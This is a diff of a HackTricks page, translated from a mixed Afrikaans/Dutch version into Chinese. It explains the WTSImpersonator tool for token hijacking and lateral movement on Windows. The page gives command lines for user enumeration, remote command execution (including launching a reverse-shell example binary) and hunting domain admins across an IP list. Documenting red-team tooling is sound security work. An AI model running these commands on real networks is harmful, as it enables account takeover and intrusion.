@@ -1,68 +1,70 @@
+{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>支持 HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
+{% endhint %}
 
-Die **WTS Impersonator**-instrument maak gebruik van die **"\\pipe\LSM_API_service"** RPC Genoemde pyp om stilletjies ingelogde gebruikers op te som en hul tokens te kaap, terwyl tradisionele Token Impersonation-tegnieke omseil word. Hierdie benadering fasiliteer naadlose laterale bewegings binne netwerke. Die innovasie agter hierdie tegniek word toegeskryf aan **Omri Baso, wie se werk beskikbaar is op [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
+**WTS Impersonator** 工具利用 **"\\pipe\LSM_API_service"** RPC 命名管道，悄无声息地枚举已登录用户并劫持他们的令牌，从而绕过传统的令牌模拟技术。这种方法促进了网络内的无缝横向移动。这项技术的创新归功于 **Omri Baso，他的工作可以在 [GitHub](https://github.com/OmriBaso/WTSImpersonator) 上找到**。
 
-### Kernfunksionaliteit
-Die instrument werk deur 'n reeks API-oproepe:
+### 核心功能
+该工具通过一系列 API 调用进行操作：
 ```powershell
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
-### Sleutelmodules en Gebruik
-- **Gebruikers Enumereren**: Lokale en externe gebruikersenumeratie is mogelijk met de tool, met behulp van commando's voor beide scenario's:
-- Lokaal:
+### 关键模块和用法
+- **枚举用户**：使用该工具可以进行本地和远程用户枚举，使用以下命令进行操作：
+- 本地：
 ```powershell
 .\WTSImpersonator.exe -m enum
 ```
-- Extern, door een IP-adres of hostnaam op te geven:
+- 远程，通过指定IP地址或主机名：
 ```powershell
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **Commando's Uitvoeren**: De modules `exec` en `exec-remote` vereisen een **Service**-context om te functioneren. Lokale uitvoering vereist eenvoudigweg het WTSImpersonator uitvoerbare bestand en een commando:
-- Voorbeeld voor lokale commando-uitvoering:
+- **执行命令**：`exec`和`exec-remote`模块需要**服务**上下文才能工作。本地执行只需WTSImpersonator可执行文件和一个命令：
+- 本地命令执行示例：
 ```powershell
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- PsExec64.exe kan worden gebruikt om een service-context te verkrijgen:
+- PsExec64.exe可用于获取服务上下文：
 ```powershell
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **Externe Commando-Uitvoering**: Hierbij wordt op afstand een service gemaakt en geïnstalleerd, vergelijkbaar met PsExec.exe, waardoor uitvoering met de juiste machtigingen mogelijk is.
-- Voorbeeld van externe uitvoering:
+- **远程命令执行**：涉及创建和安装一个远程服务，类似于PsExec.exe，允许以适当的权限执行。
+- 远程执行示例：
 ```powershell
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **Gebruikersjachtmodule**: Richt zich op specifieke gebruikers op meerdere machines en voert code uit onder hun referenties. Dit is vooral handig voor het targeten van Domeinbeheerders met lokale beheerdersrechten op verschillende systemen.
-- Gebruiksvoorbeeld:
+- **用户猎杀模块**：针对多个机器上的特定用户，在他们的凭据下执行代码。这对于针对在多个系统上具有本地管理员权限的域管理员特别有用。
+- 用法示例：
 ```powershell
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
 
 
+{% hint style="success" %}
+学习和实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>支持HackTricks</summary>
 
-Andere manieren om HackTricks te ondersteunen:
-
-* Als je je **bedrijf geadverteerd wilt zien in HackTricks** of **HackTricks in PDF wilt downloaden**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
-* Koop de [**officiële PEASS & HackTricks merchandise**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
-* **Sluit je aan bij de** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repo's.
+* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub库提交PR分享黑客技巧。
 
 </details>
+{% endhint %}
